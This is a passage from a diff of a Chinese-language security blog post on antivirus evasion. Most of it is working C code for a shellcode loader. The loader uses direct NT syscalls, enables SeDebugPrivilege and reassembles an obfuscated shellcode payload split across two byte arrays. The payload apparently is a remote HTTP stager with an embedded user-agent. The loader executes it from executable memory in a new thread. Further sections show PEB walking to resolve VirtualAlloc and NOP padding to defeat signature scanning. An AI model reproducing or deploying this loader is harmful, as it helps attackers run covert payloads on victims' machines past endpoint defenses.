+	_In_ ULONG AllocationType,
+	_In_ ULONG PageProtection,
+	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,
+	_In_ ULONG ParameterCount
+	);
+
+NTSTATUS(*NtCreateThreadEx) (
+	OUT PHANDLE hThread,
+	IN ACCESS_MASK DesiredAccess,
+	IN LPVOID ObjectAttributes,
+	IN HANDLE ProcessHandle,
+	IN LPTHREAD_START_ROUTINE lpStartAddress,
+	IN LPVOID lpParameter,
+	IN BOOL CreateSuspended,
+	IN ULONG StackZeroBits,
+	IN ULONG SizeOfStackCommit,
+	IN ULONG SizeOfStackReserve,
+	OUT LPVOID lpBytesBuffer
+	);
+
+NTSTATUS(*NtAllocateVirtualMemory)(
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	ULONG_PTR ZeroBits,
+	PSIZE_T RegionSize,
+	ULONG AllocationType,
+	ULONG Protect
+	);
+
+NTSTATUS(*ZwProtectVirtualMemory)(
+	IN HANDLE ProcessHandle,
+	IN PVOID* BaseAddress,
+	IN SIZE_T* NumberOfBytesToProtect,
+	IN ULONG NewAccessProtection,
+	OUT PULONG OldAccessProtection
+	);
+
+NTSTATUS(*NtFreeVirtualMemory)(
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	IN OUT PSIZE_T RegionSize,
+	ULONG FreeType
+	);
+
+NTSTATUS(*ZwOpenProcess)(
+	PHANDLE ProcessHandle,
+	ACCESS_MASK DesiredAccess,
+	POBJECT_ATTRIBUTES ObjectAttributes,
+	PCLIENT_ID ClientId
+	);
+
+NTSTATUS(WINAPI* ZwQuerySystemInformation)(
+	SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength
+	);
+
+NTSTATUS(*NtCreateThread)(
+	OUT PHANDLE ThreadHandle,
+	IN  ACCESS_MASK DesiredAccess,
+	IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+	IN  HANDLE ProcessHandle,
+	OUT PCLIENT_ID ClientId,
+	IN  PCONTEXT ThreadContext,
+	IN  PINITIAL_TEB InitialTeb,
+	IN  BOOLEAN CreateSuspended
+	);
+
+typedef NTSTATUS(NTAPI* _RtlGetVersion)(
+	LPOSVERSIONINFOEXW lpVersionInformation
+	);
+
+typedef void (WINAPI* _RtlInitUnicodeString)(
+	PUNICODE_STRING DestinationString,
+	PCWSTR SourceString
+	);
+
+typedef NTSYSAPI BOOLEAN(NTAPI* _RtlEqualUnicodeString)(
+	PUNICODE_STRING String1,
+	PCUNICODE_STRING String2,
+	BOOLEAN CaseInSensitive
+	);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">#undef  _UNICODE
+#define _UNICODE
+#undef  UNICODE
+#define UNICODE
+
+#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include "Dumpert.h"
+
+#pragma comment (lib, "Dbghelp.lib")
+
+#define RPL_MASK                0x0003
+#define MODE_MASK               0x0001
+#define KGDT64_NULL             0x0000
+#define KGDT64_R0_CODE          0x0010
+#define KGDT64_R0_DATA          0x0018
+#define KGDT64_R3_CMCODE        0x0020
+#define KGDT64_R3_DATA          0x0028
+#define KGDT64_R3_CODE          0x0030
+#define KGDT64_SYS_TSS          0x0040
+#define KGDT64_R3_CMTEB         0x0050
+#define KGDT64_R0_LDT           0x0060
+
+DWORD WINAPI StartAddress(LPVOID lpThreadParameter) {
+	return ((int(__stdcall*)(LPVOID))lpThreadParameter)(lpThreadParameter);
+}
+
+NTSTATUS MyInitTeb(PINITIAL_TEB InitialTeb) {
+	PVOID StackBaseAddr = NULL;
+	SIZE_T StackSize = 0x1000 * 10;
+	NTSTATUS Status;
+
+	Status = NtAllocateVirtualMemory(GetCurrentProcess(),
+		(PVOID*)&amp;StackBaseAddr,
+		0,
+		&amp;StackSize,
+		MEM_RESERVE | MEM_COMMIT,
+		PAGE_READWRITE);
+
+	if (Status != 0) {
+		printf("MyInitStack:%llx\n", Status);
+		return Status;
+	}
+	InitialTeb-&gt;StackAllocationBase = (PVOID)StackBaseAddr;
+	InitialTeb-&gt;StackBase = (PVOID)((INT64)StackBaseAddr + StackSize - 0x1000*5);
+	InitialTeb-&gt;OldInitialTeb.OldStackBase = NULL;
+	InitialTeb-&gt;OldInitialTeb.OldStackLimit = NULL;
+	InitialTeb-&gt;StackLimit = StackBaseAddr;
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS MyInitContext(
+	PCONTEXT pContext,
+	PVOID ThreadFuncAddr,
+	PVOID FuncArgAddr,
+	PVOID StackBaseAddr) {
+	// set rsp
+	pContext-&gt;Rsp = (DWORD64)StackBaseAddr;
+	// set ip and rcx
+	pContext-&gt;Rip = (DWORD64)ThreadFuncAddr;
+	pContext-&gt;Rcx = (DWORD64)FuncArgAddr;
+	// nop
+	pContext-&gt;Rax = (DWORD64)NULL;
+	pContext-&gt;Rbx = (DWORD64)NULL;
+	pContext-&gt;Rdx = (DWORD64)NULL;
+	pContext-&gt;Rsi = (DWORD64)NULL;
+	pContext-&gt;Rdi = (DWORD64)NULL;
+	pContext-&gt;R8 = (DWORD64)NULL;
+	pContext-&gt;R9 = (DWORD64)NULL;
+
+	// set context flags
+	pContext-&gt;ContextFlags = CONTEXT_FULL;
+
+	// unknow
+	pContext-&gt;EFlags = 0x3000;/* IOPL 3 */
+
+	// set seg registers
+	pContext-&gt;SegGs = KGDT64_R3_DATA | RPL_MASK;
+	pContext-&gt;SegEs = KGDT64_R3_DATA | RPL_MASK;
+	pContext-&gt;SegDs = KGDT64_R3_DATA | RPL_MASK;
+	pContext-&gt;SegCs = KGDT64_R3_CODE | RPL_MASK;
+	pContext-&gt;SegSs = KGDT64_R3_DATA | RPL_MASK;
+	pContext-&gt;SegFs = KGDT64_R3_CMTEB | RPL_MASK;
+
+	return STATUS_SUCCESS;
+}
+
+
+BOOL IsElevated() {
+	BOOL fRet = FALSE;
+	HANDLE hToken = NULL;
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &amp;hToken)) {
+		TOKEN_ELEVATION Elevation = { 0 };
+		DWORD cbSize = sizeof(TOKEN_ELEVATION);
+		if (GetTokenInformation(hToken, TokenElevation, &amp;Elevation, sizeof(Elevation), &amp;cbSize)) {
+			fRet = Elevation.TokenIsElevated;
+		}
+	}
+	if (hToken) {
+		CloseHandle(hToken);
+	}
+	return fRet;
+}
+
+BOOL SetDebugPrivilege() {
+	HANDLE hToken = NULL;
+	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) {
+		return FALSE;
+	}
+
+	TokenPrivileges.PrivilegeCount = 1;
+	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
+
+	LPWSTR lpwPriv = L"SeDebugPrivilege";
+	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &amp;TokenPrivileges.Privileges[0].Luid)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	if (!AdjustTokenPrivileges(hToken, FALSE, &amp;TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	CloseHandle(hToken);
+	return TRUE;
+}
+
+
+int wmain(int argc, wchar_t* argv[]) {
+
+	// 仅支持64位系统
+	if (sizeof(LPVOID) != 8) {
+		exit(1);
+	}
+	//判断是否为管理员权限
+	if (!IsElevated()) {
+		exit(1);
+	}
+
+	SetDebugPrivilege();
+
+	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));
+
+	// 获取版本信息
+	OSVERSIONINFOEXW osInfo;
+	LPWSTR lpOSVersion;
+	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
+
+	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
+		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
+	if (RtlGetVersion == NULL) {
+		return FALSE;
+	}
+
+	wprintf(L"[1] Checking OS version details:\n");
+	RtlGetVersion(&amp;osInfo);
+	swprintf_s(pWinVerInfo-&gt;chOSMajorMinor, _countof(pWinVerInfo-&gt;chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
+	pWinVerInfo-&gt;dwBuildNumber = osInfo.dwBuildNumber;
+
+	if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"10.0") == 0) {
+		lpOSVersion = L"10 or Server 2016";
+		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);
+		wprintf(L"	[+] Mapping version specific System calls.\n");
+		NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemory10;
+		ZwProtectVirtualMemory = &amp;ZwProtectVirtualMemory10;
+		NtCreateThread = &amp;NtCreateThread10;
+		pWinVerInfo-&gt;SystemCall = 0x3F;
+	}
+	else if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"6.1") == 0 &amp;&amp; osInfo.dwBuildNumber == 7601) {
+		lpOSVersion = L"7 SP1 or Server 2008 R2";
+		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);
+		wprintf(L"	[+] Mapping version specific System calls.\n");
+		NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemory7SP1;
+		ZwProtectVirtualMemory = &amp;ZwProtectVirtualMemory7SP1;
+		NtCreateThread = &amp;NtCreateThread7SP1;
+		pWinVerInfo-&gt;SystemCall = 0x3C;
+	}
+	else if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"6.2") == 0) {
+		lpOSVersion = L"8 or Server 2012";
+		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);
+		exit(1);
+		wprintf(L"	[+] Mapping version specific System calls.\n");
+		pWinVerInfo-&gt;SystemCall = 0x3D;
+	}
+	else if (_wcsicmp(pWinVerInfo-&gt;chOSMajorMinor, L"6.3") == 0) {
+		lpOSVersion = L"8.1 or Server 2012 R2";
+		wprintf(L"	[+] Operating System is Windows %ls, build number %d\n", lpOSVersion, pWinVerInfo-&gt;dwBuildNumber);
+		wprintf(L"	[+] Mapping version specific System calls.\n");
+		NtAllocateVirtualMemory = &amp;NtAllocateVirtualMemory81;
+		ZwProtectVirtualMemory = &amp;ZwProtectVirtualMemory81;
+		NtCreateThread = &amp;NtCreateThread81;
+		pWinVerInfo-&gt;SystemCall = 0x3E;
+	}
+	else {
+		wprintf(L"	[!] OS Version not supported.\n\n");
+		exit(1);
+	}
+
+	/*
+	Shellcode 每三个字节替换成\x00 进行加密
+	*/
+	unsigned char data[] = "\x00\xe8\x89\x00\x00\x00\x00\x89\xe5\x00\xd2\x64\x00\x52\x30\x00\x52\x0c\x00\x52\x14\x00\x72\x28\x00\xb7\x4a\x00\x31\xff\x00\xc0\xac\x00\x61\x7c\x00\x2c\x20\x00\xcf\x0d\x00\xc7\xe2\x00\x52\x57\x00\x52\x10\x00\x42\x3c\x00\xd0\x8b\x00\x78\x85\x00\x74\x4a\x00\xd0\x50\x00\x48\x18\x00\x58\x20\x00\xd3\xe3\x00\x49\x8b\x00\x8b\x01\x00\x31\xff\x00\xc0\xac\x00\xcf\x0d\x00\xc7\x38\x00\x75\xf4\x00\x7d\xf8\x00\x7d\x24\x00\xe2\x58\x00\x58\x24\x00\xd3\x66\x00\x0c\x4b\x00\x58\x1c\x00\xd3\x8b\x00\x8b\x01\x00\x89\x44\x00\x24\x5b\x00\x61\x59\x00\x51\xff\x00\x58\x5f\x00\x8b\x12\x00\x86\x5d\x00\x6e\x65\x00\x00\x68\x00\x69\x6e\x00\x54\x68\x00\x77\x26\x00\xff\xd5\x00\x00\x00\x00\x00\x31\x00\x57\x57\x00\x57\x57\x00\x3a\x56\x00\xa7\xff\x00\xe9\xa4\x00\x00\x00\x00\x31\xc9\x00\x51\x6a\x00\x51\x51\x00\xbb\x01\x00\x00\x53\x00\x68\x57\x00\x9f\xc6\x00\xd5\x50\x00\x8c\x00\x00\x00\x5b\x00\xd2\x52\x00\x00\x32\x00\x84\x52\x00\x52\x53\x00\x50\x68\x00\x55\x2e\x00\xff\xd5\x00\xc6\x83\x00\x50\x68\x00\x33\x00\x00\x89\xe0\x00\x04\x50\x00\x1f\x56\x00\x75\x46\x00\x86\xff\x00\x5f\x31\x00\x57\x57\x00\xff\x53\x00\x68\x2d\x00\x18\x7b\x00\xd5\x85\x00\x0f\x84\x00\x01\x00\x00\x31\xff\x00\xf6\x74\x00\x89\xf9\x00\x09\x68\x00\xc5\xe2\x00\xff\xd5\x00\xc1\x68\x00\x21\x5e\x00\xff\xd5\x00\xff\x57\x00\x07\x51\x00\x50\x68\x00\x57\xe0\x00\xff\xd5\x00\x00\x2f\x00\x00\x39\x00\x75\x07\x00\x50\xe9\x00\xff\xff\x00\x31\xff\x00\x91\x01\x00\x00\xe9\x00\x01\x00\x00\xe8\x6f\x00\xff\xff\x00\x77\x42\x00\x6d\x00\x00\x42\xc6\x00\x6f\xba\x00\x3d\xd8\x00\xfc\x47\x00\xbc\xdc\x00\xe5\xb9\x00\x57\x1e\x00\xe6\xd9\x00\x4f\x31\x00\x37\x66\x00\x69\xf2\x00\xae\xf8\x00\x5d\xde\x00\x53\x49\x00\x59\x04\x00\x49\x62\x00\x1d\x70\x00\xd4\xcb\x00\x66\x6d\x00\x06\x5b\x00\xe8\xc7\x00\xf2\xcf\x00\xa7\x75\x00\x9a\xb0\x00\x00\x55\x00\x65\x72\x00\x41\x67\x00\x6e\x74\x00\x20\x4d\x00\x7a\x69\x00\x6c\x61\x00\x34\x2e\x00\x20\x28\x00\x6f\x6d\x00\x61\x74\x00\x62\x6c\x00\x3b\x20\x00\x53\x49\x00\x20\x37\x00\x30\x3b\x00\x57\x69\x00\x64\x6f\x00\x73\x20\x00\x54\x20\x00\x2e\x31\x00\x20\x54\x00\x69\x64\x00\x6e\x74\x00\x34\x2e\x00\x29\x0d\x00\x00\x65\x00\x75\x9d\x00\x44\xb7\x00\xc6\x44\x00\xdc\xc8\x00\x94\xf1\x00\x08\x48\x00\xac\xac\x00\xf0\xfa\x00\xf4\x24\x00\x95\xec\x00\xbe\x97\x00\x01\x5e\x00\x85\x66\x00\xd3\x11\x00\xd8\xb5\x00\x4b\x87\x00\x84\x9f\x00\x50\x09\x00\x54\x1b\x00\xc0\x50\x00\x75\xd9\x00\xa2\x05\x00\x23\x9d\x00\x5b\x20\x00\xf3\x86\x00\x3b\x9f\x00\x07\x77\x00\xa0\x8a\x00\x5a\x87\x00\x64\xd1\x00\xcf\xe2\x00\xa1\x26\x00\xdb\x63\x00\xca\x11\x00\x48\x45\x00\x5c\x05\x00\x42\x1e\x00\x9a\x23\x00\xb0\xe7\x00\xfa\x35\x00\xf4\xe3\x00\x31\xe0\x00\xcd\x8f\x00\xf8\x14\x00\x0f\x89\x00\x03\xa2\x00\xce\x2b\x00\x5f\x57\x00\x32\xac\x00\x3e\xad\x00\xa8\xc8\x00\x66\x01\x00\x6c\xa9\x00\x36\xed\x00\xa2\x57\x00\x95\x06\x00\x9b\x07\x00\xc4\x02\x00\x44\xf0\x00\x9e\x36\x00\x6f\xdf\x00\x33\xce\x00\xa9\xce\x00\xce\x0a\x00\xf4\xb9\x00\x5c\xae\x00\x23\xce\x00\xac\x8f\x00\x09\x85\x00\x37\xb9\x00\x25\x6b\x00\x38\xe3\x00\xda\xd9\x00\x96\x1c\x00\x0c\x00\x00\xf0\xb5\x00\x56\xff\x00\x6a\x40\x00\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x00\xa4\x53\x00\xff\xd5\x00\xb9\x00\x00\x00\x00\x00\xd9\x51\x00\x89\xe7\x00\x68\x00\x00\x00\x00\x00\x56\x68\x00\x96\x89\x00\xff\xd5\x00\xc0\x74\x00\x8b\x07\x00\xc3\x85\x00\x75\xe5\x00\xc3\xe8\x00\xfd\xff\x00\x31\x30\x00\x2e\x31\x00\x2e\x31\x00\x36\x2e\x00\x37\x00\x00\x00\x00\x00";
+	char a1[] = "\xfc\x00\x60\x31\x8b\x8b\x8b\x8b\x0f\x26\x31\x3c\x02\xc1\x01\xf0\x8b\x8b\x01\x40\xc0\x01\x8b\x8b\x01\x3c\x34\xd6\x31\xc1\x01\xe0\x03\x3b\x75\x8b\x01\x8b\x8b\x01\x04\xd0\x24\x5b\x5a\xe0\x5a\xeb\x68\x74\x77\x69\x4c\x07\xe8\x00\xff\x57\x68\x79\xd5\x00\x5b\x51\x03\x68\x00\x50\x89\xff\xe9\x00\x31\x68\xc0\x52\x52\xeb\x3b\x89\xc3\x80\x00\x6a\x6a\x68\x9e\xd5\xff\x6a\x56\x06\xff\xc0\xca\x00\x85\x04\xeb\xaa\x5d\x89\x45\x31\x31\x6a\x56\xb7\x0b\xbf\x00\xc7\x58\x7b\xff\xe9\x00\xc9\x00\xff\x2f\x36\x8b\x20\xaf\xf5\xe9\xb6\xf5\x9b\x86\xbc\x09\x77\x40\x33\x2e\x1a\x31\x64\x02\xb6\x09\x07\xd3\x48\xa8\x73\x2d\x65\x3a\x6f\x6c\x2f\x30\x63\x70\x69\x65\x4d\x45\x2e\x20\x6e\x77\x4e\x35\x3b\x72\x65\x2f\x30\x0a\x1b\xb1\xb6\x11\xa7\x6e\x13\xc6\x3d\x5d\x24\x53\xc2\x36\x91\xfe\x53\x5a\x64\x3b\x31\x02\xf1\x0e\x22\x54\xa9\x33\x03\xa4\x27\x4e\xd9\x6b\xdc\x2f\x09\x3c\x3b\x8d\x26\x74\x43\x03\x83\x66\xc9\x1c\x0e\x9a\xef\x2b\x10\x15\xaf\x89\x8c\x1f\xcb\x51\x5c\xc1\x7a\xed\x94\x2b\x50\x72\x5c\x52\xc5\x97\x1b\xb3\x5c\x68\xa2\xd5\x68\x00\x00\x00\x58\xe5\x93\x00\x01\x53\x57\x20\x53\x12\xe2\x85\xc6\x01\xc0\x58\x89\xff\x33\x30\x39\x33\x00\x06";
+
+	SIZE_T Size = sizeof(data);
+	for (int i = 0; i &lt; sizeof(a1); i++) {
+		memcpy(&amp;data[i * 3], &amp;a1[i], 1);
+	}
+
+	PVOID lpvAddr = NULL;
+	NTSTATUS status;
+
+	status = NtAllocateVirtualMemory(GetCurrentProcess(), &amp;lpvAddr, 0, &amp;Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	RtlMoveMemory(lpvAddr, data, sizeof(data));
+
+	HANDLE ThreadHandle = NULL;
+	CONTEXT NewThreadContext = { 0 };
+	INITIAL_TEB InitialTeb = { 0 };
+	OBJECT_ATTRIBUTES ObjAttr2 = { 0 };
+	CLIENT_ID ReturnTid = { 0 };
+
+	if (MyInitTeb(&amp;InitialTeb) != 0) {
+		return -1;
+	}
+
+	if (MyInitContext(
+		&amp;NewThreadContext,
+		(PVOID)lpvAddr,
+		NULL,
+		InitialTeb.StackBase) != 0)
+	{
+		return -1;
+	}
+	InitializeObjectAttributes(&amp;ObjAttr2, NULL, 0, NULL, NULL);
+	status = ZwProtectVirtualMemory(GetCurrentProcess(), &amp;lpvAddr, &amp;Size, PAGE_EXECUTE, &amp;OldProtection);
+
+	status = NtCreateThread(
+		&amp;ThreadHandle,
+		THREAD_ALL_ACCESS,
+		&amp;ObjAttr2,
+		GetCurrentProcess(),
+		&amp;ReturnTid,
+		&amp;NewThreadContext,
+		&amp;InitialTeb,
+		FALSE);
+
+	WaitForSingleObject(ThreadHandle, INFINITE);
+	//ULONG OldProtection;
+	//status = ZwProtectVirtualMemory(GetCurrentProcess(), &amp;lpvAddr, &amp;Size, PAGE_EXECUTE, &amp;OldProtection);
+
+	//HANDLE s;
+	//s = CreateThread(0, 0, lpvAddr, NULL, 0, 0);
+
+	//WaitForSingleObject(s, INFINITE);
+	return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="动态调用-API-函数"><a href="#动态调用-API-函数" class="headerlink" title="动态调用 API 函数"></a>动态调用 API 函数</h2><pre class="line-numbers language-none"><code class="language-none">void* ntAllocateVirtualMemory = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtAllocateVirtualMemory");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://4hou.win/wordpress/?cat=612">https://4hou.win/wordpress/?cat=612</a></p>
+<p>通过动态调用 API 函数的方式来调用 virtualalloc 函数。具体的做法是， load kernel32.dll 库，使用汇编语言从 kernel32 库中取得 virtualalloc 函数在内存中的地址，然后执行。 另外,假设Loadlibrary函数也被hook了(这也太硬核了),我们也可以从PEB中获取函数地址,下面代码demo为Load kernel32.dll, 再有甚者,对机器码做了模式匹配,我们可以在代码中加入一些nop指令或者一些正常功能的垃圾混淆代码。</p>
+<pre class="line-numbers language-none"><code class="language-none">//HMODULE hModule =LoadLibrary(_T("Kernel32.dll"));
+HMODULE hModule = NULL;
+
+//LoadLibrary 记得从中加入一些nop指令(空指令雪橇)
+//空指令雪橇原理: 针对机器码匹配的话基本是进行模式匹配的
+	__asm {
+
+		mov esi, fs: [0x30]//得到PEB地址
+     nop
+     nop
+		mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
+		mov esi, [esi + 0x1c]//一个双向链表的地址
+		mov esi, [esi]//得到第二个条目kernelBase的链表
+		mov esi, [esi]//得到第三个条目kernel32链表（win10）
+		mov esi, [esi + 0x8] //kernel32.dll地址
+		mov hModule, esi
+	}
+
+HANDLE shellcode_handler;
+FARPROC Address = GetProcAddress(hModule,"VirtualAlloc");//拿到virtualalloc的地址
+_asm
+{
+      push 40h  //push传参
+      push 1000h
+      push 29Ah
+      push 0
+      call Address  //函数调用
+      mov shellcode_handler, eax
+}
+memcpy(shellcode_handler, newshellcode,sizeof newshellcode);
+((void(*)())shellcode_handler)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="垃圾混淆代码—nop-nop空指令雪橇"><a href="#垃圾混淆代码—nop-nop空指令雪橇" class="headerlink" title="垃圾混淆代码—nop nop空指令雪橇"></a>垃圾混淆代码—nop nop空指令雪橇</h2><pre class="line-numbers language-none"><code class="language-none">_asm {
+mov esi, fs:[0x30]//得到PEB地址
+NOP
+NOP
+NOP
+NOP
+NOP
+mov esi, [esi + 0xc]//指向PEB_LDR_DATA结构的首地址
+NOP
+NOP
+NOP
+NOP
+mov esi, [esi + 0x1c]//一个双向链表的地址
+NOP
+NOP
+NOP
+NOP
+mov esi, [esi]//得到第二个条目kernelBase的链表
+NOP
+NOP
+NOP
+mov esi, [esi]//得到第三个条目kernel32链表（win10）
+NOP
+NOP
+mov esi, [esi + 0x8] //kernel32.dll地址
+NOP
+NOP
+mov hModule, esi
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
